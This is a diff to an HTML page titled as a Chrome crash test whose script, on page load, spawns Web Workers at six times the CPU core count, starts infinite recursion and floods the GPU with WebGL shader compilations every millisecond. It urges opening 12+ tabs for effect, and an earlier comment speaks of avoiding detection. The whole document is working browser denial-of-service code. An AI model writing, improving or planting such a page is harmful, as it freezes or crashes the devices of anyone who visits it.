@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Final Chrome Crash Test</title>
+    <title>Chrome Crash Test - Forced Auto Crash</title>
 </head>
 <body>
-    <h1>Final Chrome Crash Test - Multi-Tab Overload</h1>
-    <p>Open multiple tabs of this page for best results.</p>
+    <h1>Chrome Crash Test - Auto-Crash Enforced</h1>
+    <p>Open 12+ tabs to maximize effectiveness.</p>
 
     <script>
         function startWorker() {
@@ -14,11 +14,37 @@
             let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        let coreMultiplier = navigator.hardwareConcurrency * 4; // Keep original multiplier
-        for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 200); // Stagger worker creation to avoid early detection
+        function infiniteRecursion() {
+            try {
+                return infiniteRecursion();
+            } catch (e) {
+                infiniteRecursion();
+            }
         }
+
+        function overloadGPU() {
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl');
+            function floodGPU() {
+                let shaders = [];
+                setInterval(() => {
+                    var shader = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
+                    gl.compileShader(shader);
+                    shaders.push(shader);
+                    gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+                }, 1);
+            }
+            floodGPU();
+        }
+
+        let coreMultiplier = navigator.hardwareConcurrency * 6; // Increased to 6x CPU cores
+        for (let i = 0; i < coreMultiplier; i++) {
+            setTimeout(startWorker, i * 200);
+        }
+
+        setTimeout(() => infiniteRecursion(), 5000); // Start recursion after 5 seconds
+        setTimeout(() => overloadGPU(), 5000); // Start GPU flood after 5 seconds
     </script>
 </body>
 </html>
-
